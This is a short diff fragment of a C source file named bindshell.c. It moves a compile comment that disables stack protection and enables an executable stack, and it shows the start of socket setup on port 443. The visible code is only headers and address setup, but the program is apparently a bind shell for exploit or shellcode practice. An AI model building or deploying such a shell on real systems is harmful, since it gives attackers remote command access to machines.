@@ -8,10 +8,12 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <unistd.h>
- #include <linux/net.h>
+#include <linux/net.h>
+
+// gcc -fno-stack-protector -z execstack bindshell.c -o bindshell
+
 int main() 
 {
-	// gcc -fno-stack-protector -z execstack bindshell.c -o bindshell
 	struct sockaddr_in addr;
 	addr.sin_family = AF_INET;
 	addr.sin_port = htons(443);
